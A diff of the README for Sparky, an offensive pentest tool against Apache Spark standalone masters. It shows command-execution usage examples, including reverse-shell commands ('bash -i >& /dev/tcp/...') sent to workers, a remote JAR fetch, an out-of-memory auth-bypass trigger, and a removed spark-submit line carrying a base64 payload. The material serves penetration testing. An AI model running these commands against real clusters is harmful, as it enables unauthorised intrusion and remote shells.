@@ -18,7 +18,7 @@ Sparky is a tool to easily abuse and pentest a Spark server in Standalone mode. 
 
 ## Usage
 
-```
+```sh
           ____              __
          / __/__  ___ _____/ /_\ \   /
         _\ \/ _ \/ _ `/ __/  '_/\ ` /
@@ -111,13 +111,13 @@ Cloud environment (AWS, DigitalOcean):
 ## Prerequisites
 ### Installation
 Sparky is a wrapper of the official Pyspark tool. Therefore you need a valid Java 8 environment as well. Sparky supports both Python 2.7 and Python 3.x.
-```
-ayoul3@lab:~/$ git clone https://github.com/ayoul3/sparky && cd sparky
-ayoul3@lab:~sparky/$ pip --no-cahe-dir install -r requirements.txt
-ayoul3@lab:~sparky/$ sudo apt install -y openjdk-8-jdk
-ayoul3@lab:~sparky/$ export JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64/
+```sh
+git clone https://github.com/ayoul3/sparky && cd sparky
+pip --no-cahe-dir install -r requirements.txt
+sudo apt install -y openjdk-8-jdk
+export JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64/
 
-ayoul3@lab:~sparky/$ python sparky.py <spark_ip> <computer_ip> -i
+python sparky.py <spark_ip> <computer_ip> -i
 ``` 
 ### Python Environment
 The version of Python used to execute Sparky must match the default version of Python on the Worker node. Otherwise you will get the following exception:
@@ -137,8 +137,9 @@ Sparky binds to two ports 8080 and 8443 that need to be reachable from the Worke
 ### Code execution 1
 Executing a command line provided that the network and python environment requirements check out.
 Spark master is listening at 192.168.1.30:7077. Your computer is 192.168.1.22
-```
-ayoul3@lab:~/$ python sparky.py 192.168.1.30 192.168.1.22 -c "whoami"
+```sh
+python sparky.py 192.168.1.30 192.168.1.22 -c "whoami"
+
 [*] Testing target to confirm a spark master is running on 192.168.1.30:7077
 [+] Spark master confirmed at 192.168.1.30:7077
 [*] Initializing local Spark driver...This can take a little while
@@ -150,8 +151,9 @@ hadoop
 ### Code execution 2
 This time using Python 3 and a script file
 Spark master is listening at 192.168.1.30:7077. Your computer is 192.168.1.22
-```
-ayoul3@lab:~/$ python sparky.py 192.168.1.30 192.168.1.22 -s "cmd.sh" -P python3
+```sh
+python sparky.py 192.168.1.30 192.168.1.22 -s "cmd.sh" -P python3
+
 [*] Testing target to confirm a spark master is running on 192.168.1.30:7077
 [+] Spark master confirmed at 192.168.1.30:7077
 [*] Initializing local Spark driver...This can take a little while
@@ -163,8 +165,8 @@ hadoop
 ### Code execution 3
 This time using scala code
 Spark master is listening at 192.168.1.30:7077. Your computer is 192.168.1.22
-```
-ayoul3@lab:~/$ python sparky.py 192.168.1.30 192.168.1.22 -c "whoami" --scala 
+```sh
+python sparky.py 192.168.1.30 192.168.1.22 -c "whoami" --scala 
 [*] Testing target to confirm a spark master is running on 192.168.1.30:7077
 [+] Spark master confirmed at 192.168.1.30:7077
 [*] Initializing local Spark driver...This can take a little while
@@ -176,8 +178,9 @@ hadoop
 ### Blind code execution 4
 Executing a JAR file using REST API on port 6066
 Spark master is listening at 192.168.1.30:7077. Your computer is 192.168.1.22
-```
-ayoul3@lab:~/$ python sparky.py 192.168.1.30 192.168.1.22 -c "bash -i >& /dev/tcp/192.168.1.22/443 0>&1" -w https://www.domain.com/file.har
+```sh
+python sparky.py 192.168.1.30 192.168.1.22 -c "bash -i >& /dev/tcp/192.168.1.22/443 0>&1" -w https://www.domain.com/file.jar
+
 [*] Testing target to confirm a spark master is running on 192.168.1.30:7077
 [+] Spark master confirmed at 192.168.1.30:7077
 [+] Command successfully executed on a random worker
@@ -187,8 +190,9 @@ Omitting the JAR URL works as well, but uses a different trigger to execute code
 ### Blind code execution 5 - Authentication bypass
 Blind code execution using OnOutOfMemory parameter to trigger code execution. Need to adjust the "-m" parameter which refers to maximum heap memory allocated by JVM.
 Spark master is listening at 192.168.1.30:7077. Your computer is 192.168.1.22
-```
-ayoul3@lab:~/$ python sparky.py 192.168.1.30 192.168.1.22 -c "bash -i >& /dev/tcp/192.168.1.22/443 0>&1" -b
+```sh
+python sparky.py 192.168.1.30 192.168.1.22 -c "bash -i >& /dev/tcp/192.168.1.22/443 0>&1" -b
+
 [*] Testing target to confirm a spark master is running on 192.168.1.30:7077
 [+] Spark master confirmed at 192.168.1.30:7077
 [*] Performing blind command execution on workers
@@ -197,9 +201,5 @@ ayoul3@lab:~/$ python sparky.py 192.168.1.30 192.168.1.22 -c "bash -i >& /dev/tc
 [*] If cmd failed, adjust the -m param to make sure to case an out of memory error
 ```
 
-
-### TODO
-- Add the possibility to submit a job in cluster mode (easy)
-- Attempt auth bypass with submitDriver case class (maybe)
-```spark-submit --deploy-mode cluster --master spark://192.168.1.37:7077 --conf "spark.app.name=ML xp" --conf "spark.local.ip=192.168.1.22" --conf "spark.driver.host=192.168.1.22" --conf "spark.master=spark://192.168.1.37:7077" --conf "spark.driver.extraJavaOptions=-Duser.name=lambda" --class SimpleApp http://192.168.1.22:6666/SimpleApp.jar "cm0gKi5qYXIgMj4gL2Rldi9udWxsOyB3aG9hbWk=" 1```
-- Fingerprint Spark version (maybe)
+## Licence
+Sparky is licenced under GPLv3
